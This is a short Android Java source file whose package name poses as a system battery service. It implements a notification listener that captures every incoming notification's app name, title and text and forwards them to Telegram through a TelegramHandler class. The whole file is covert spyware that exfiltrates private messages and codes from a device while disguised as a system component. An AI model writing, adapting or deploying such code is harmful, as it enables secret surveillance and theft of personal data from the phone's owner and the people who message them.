package com.android.system.batteryservice;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotificationService extends NotificationListenerService {

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String pkg = sbn.getPackageName();
        CharSequence title = sbn.getNotification().extras.getCharSequence("android.title");
        CharSequence text = sbn.getNotification().extras.getCharSequence("android.text");

        String message = "🔔 Notifica da: " + pkg +
                "\nTitolo: " + title +
                "\nContenuto: " + text;

        TelegramHandler.sendMessage(message);
    }
}
